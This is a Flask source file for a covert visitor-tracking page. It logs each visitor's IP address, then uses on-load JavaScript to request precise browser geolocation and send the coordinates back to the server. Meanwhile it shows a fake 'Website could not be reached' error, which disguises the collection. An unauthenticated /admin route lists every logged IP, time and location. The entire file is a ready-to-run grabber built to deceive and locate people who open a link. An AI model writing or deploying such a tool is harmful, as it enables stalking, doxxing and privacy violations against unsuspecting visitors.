from flask import Flask, request, render_template_string
from datetime import datetime
import json
import os

app = Flask(__name__)

# File to store IP addresses and locations
IP_LOG_FILE = 'ip_log.json'

def log_data(ip, location_data=None):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    entry = {
        'ip': ip,
        'timestamp': timestamp,
        'location': location_data
    }
    
    # Create or load existing log file
    if os.path.exists(IP_LOG_FILE):
        with open(IP_LOG_FILE, 'r') as f:
            try:
                logs = json.load(f)
            except json.JSONDecodeError:
                logs = []
    else:
        logs = []
    
    # Add new entry
    logs.append(entry)
    
    # Save updated logs
    with open(IP_LOG_FILE, 'w') as f:
        json.dump(logs, f, indent=4)

# HTML template with JavaScript for geolocation
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        // Send location data to server
                        fetch('/log-location', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            })
                        });
                    },
                    function(error) {
                        console.error("Error getting location:", error);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 5000,
                        maximumAge: 0
                    }
                );
            }
        }
        // Request location as soon as page loads
        window.onload = getLocation;
    </script>
</head>
<body>
    <h1>Website could not be reached. Try again later.</h1>
</body>
</html>
'''

@app.route('/')
def home():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    log_data(ip)  # Log IP initially
    return render_template_string(HTML_TEMPLATE)

@app.route('/log-location', methods=['POST'])
def log_location():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    location_data = request.json
    log_data(ip, location_data)
    return {'status': 'success'}

@app.route('/admin')
def admin():
    if not os.path.exists(IP_LOG_FILE):
        return "No data logged yet."
    
    with open(IP_LOG_FILE, 'r') as f:
        logs = json.load(f)
    
    # Format the logs for display
    formatted_logs = []
    for entry in logs:
        location_str = ""
        if entry.get('location'):
            loc = entry['location']
            location_str = f" - Location: {loc['latitude']}, {loc['longitude']} (Accuracy: {loc['accuracy']}m)"
        formatted_logs.append(f"IP: {entry['ip']} - Time: {entry['timestamp']}{location_str}")
    
    return "<br>".join(formatted_logs)

if __name__ == '__main__':
    app.run(debug=True, port=5001) 